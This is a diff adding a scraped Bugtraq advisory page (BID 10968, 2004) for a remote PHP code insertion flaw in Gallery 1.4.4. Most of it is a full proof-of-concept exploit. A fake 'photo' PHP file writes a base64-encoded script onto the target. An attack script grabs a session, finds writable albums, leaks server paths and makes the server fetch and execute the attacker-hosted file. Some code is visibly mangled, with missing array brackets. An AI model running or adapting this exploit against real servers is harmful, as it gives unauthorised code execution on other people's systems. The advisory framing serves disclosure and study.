@@ -1,0 +1,121 @@
+#SpeeDr00t@Black Falcon<br>#bid10968<p><b><span style="font-size: 18pt;">Gallery Remote Server-Side Script Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10968/info">info</a><br><a href="http://www.securityfocus.com/bid/10968/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10968/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10968/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10968/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10968
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Design Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 17 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 17 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to acidbits . &lt;acidbits@hotmail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Gentoo Linux 1.4 _rc3<br/>
+					
+				
+					Gentoo Linux 1.4 _rc2<br/>
+					
+				
+					Gentoo Linux 1.4 _rc1<br/>
+					
+				
+					Gentoo Linux 1.4 <br/>
+					
+				
+					Gentoo Linux 1.2 <br/>
+					
+				
+					Gentoo Linux 1.1 a<br/>
+					
+				
+					Gentoo Linux 0.7 <br/>
+					
+				
+					Gentoo Linux 0.5 <br/>
+					
+				
+					Bharat Mediratta Gallery 1.4.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Bharat Mediratta Gallery 1.4.4 -pl1<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/>++  galfakeimg.php  ++<br/><br/>        This is the content of galfakeimg.php. It has to be placed in a<br/>        remote web directory accessible by the gallery script.<br/><br/>---8-&lt;-------------------------8-&lt;-------------------------8&lt;---<br/>&lt;?php<br/>echo "&lt;?php<br/>\$f=fopen(trim(base64_decode(dGVzdC5waHAg)),w);fputs(\$f,trim(base64_decode(PD8gZWNobyAnPHByZT4gXCAgLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCAgLzxicj4gKE9vKSAgVGhpcy<br/>BnYWxsZXJ5IGlzIHZ1bG5lcmFibGUgISAgKG9PKTxicj4vL3x8XFxcXCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vfHxcXFxcIDwvcHJlPic7Pz4K)));fclose(\$f);<br/>?&gt;\n";<br/>for($x=0;$x&lt;65535;$x++) echo " \n";<br/>while(1){}<br/>?&gt;<br/>---8-&lt;-------------------------8-&lt;-------------------------8&lt;---<br/><br/>*/<br/><br/><br/>define( XEC_TIMEOUT, 5);<br/><br/>echo "+--------------------------------------------------------------+\n|<br/>Gallery 1.4.4 save_photos.php PHP Insertion Proof of Concept |\n| By<br/>aCiDBiTS        acidbits@hotmail.com       17-August-2004<br/>|\n+--------------------------------------------------------------+\n\n";<br/><br/><br/>if($argc&lt;3)     die("Usage: ".$argv0." URL_to_fake_photo<br/>URL_to_Gallery\n\n");<br/>$host=$argv2;<br/>if(substr($host,strlen($host)-1,1)!='/') $host.='/';<br/>$fakephoto=$argv1;<br/><br/>echo "+ Obtaining PHPSESSID ... \n     ";<br/>$webc=get_web($host."view_album.php?set_albumName=".$album0, 1, '');<br/>$temp=explode("PHPSESSID=",$webc);<br/>$temp1=explode(";",$temp1);<br/>$phps="PHPSESSID=".$temp10.";";<br/>echo $phps;<br/><br/>echo "\n\n+ Getting album names ...\n     ";<br/>$webc=get_web($host, 0, $phps);<br/>$temp=explode("set_albumName=",$webc);<br/>$nalbum=0;<br/>while($temp($nalbum*2)+1){<br/>        $temp1= explode( "\"", $temp($nalbum*2)+1);<br/>        $album$nalbum=$temp10;<br/>        echo $album$nalbum." ";<br/>        $nalbum++;<br/>}<br/>if(!$nalbum) die(" Failed!\n\n");<br/><br/><br/>echo "\n\n+ Searching an album with permissions to add photos ...";<br/>$walbum='';<br/>foreach( $album as $temp){<br/>        $webc=get_web($host."view_album.php?set_albumName=".$temp, 0, $phps);<br/>        $webc=send_post( $host."save_photos.php",<br/>urlencode("urls=".$host."&amp;setCaption=1"), $phps);<br/>        echo "\n     ".$temp." -&gt; ";<br/>        if( ereg( "You are no allowed to perform this action", $webc) )<br/>                echo "No";<br/>        else {<br/>                echo "Yes";<br/>                $walbum=$temp;<br/>        }<br/>}<br/>if( !$walbum ) die ("\n\nFailed! No permissions in any album.\n\n");<br/>echo "\n     Using: ".$walbum;<br/><br/>echo "\n\n+ Getting gallery &amp; temporal directory paths ...";<br/>$webc=get_web($host."view_album.php?set_albumName=".$walbum, 0, $phps);<br/>$temp='/';<br/>for($x=0;$x&lt;256;$x++) $temp.='a';<br/>$webc=send_post( $host."save_photos.php",<br/>urlencode("urls")."=".urlencode($fakephoto.$temp)."&amp;setCaption=1", $phps);<br/>$temp=explode("fopen(\"",$webc);<br/>$temp1=explode("photo",$temp1);<br/>$tmpd=$temp10;<br/>echo "\n     Temporal directory: ".$tmpd;<br/>$temp=explode("resource in &lt;b&gt;",$webc);<br/>$temp1=explode("save_photo",$temp1);<br/>$scrptd=$temp10;<br/>echo "\n     Gallery directory: ".$scrptd;<br/><br/>if( !ereg( $scrptd, $tmpd) ) die ("\n\nTemporal directory is out of<br/>gallery's webtree. Can't continue.\n\n" );<br/><br/>$temp=explode("/",$fakephoto);<br/>end($temp);<br/>$sname=current($temp);<br/>echo "\n\n+ Uploading $sname and executing it ...";<br/>$webc=send_post( $host."save_photos.php",<br/>urlencode("urls")."=".urlencode($fakephoto)."&amp;setCaption=1", $phps);<br/>//Maybe you'll need to wait some more seconds, check XEC_TIMEOUT<br/>$webc=get_web($host.str_replace($scrptd,'',$tmpd)."photo.".$sname, 0,<br/>$phps);<br/><br/>echo "\n\n    Now go to: ".$host.str_replace($scrptd,'',$tmpd)."test.php";<br/><br/>die("\n\n     \  /         \  /\n     (Oo)  Done!  (oO)\n    //||\\\//||\\\\\n\n");<br/><br/><br/>function get_web($url, $h, $cookie)<br/>{<br/>        $ch=curl_init();<br/>        curl_setopt ($ch, CURLOPT_URL, $url);<br/>        curl_setopt ($ch, CURLOPT_HEADER, $h);<br/>        curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);<br/>        curl_setopt ($ch, CURLOPT_COOKIE, $cookie);<br/>        $data=curl_exec ($ch);<br/>        curl_close ($ch);<br/>        return $data;<br/>}<br/><br/>function send_post($url,$data, $cookie)<br/>{<br/>        $ch=curl_init();<br/>        curl_setopt ($ch, CURLOPT_URL, $url );<br/>        curl_setopt ($ch, CURLOPT_HEADER, 0);<br/>        curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1);<br/>        curl_setopt ($ch, CURLOPT_POST, 1);<br/>        curl_setopt ($ch, CURLOPT_POSTFIELDS, $data );<br/>        curl_setopt ($ch, CURLOPT_COOKIE, $cookie);<br/>        curl_setopt ($ch, CURLOPT_TIMEOUT, XEC_TIMEOUT) ;<br/>        $data=curl_exec ($ch);<br/>        curl_close ($ch);<br/>        return $data;<br/>}
+	
+		<ul>
+</ul>
+</div>
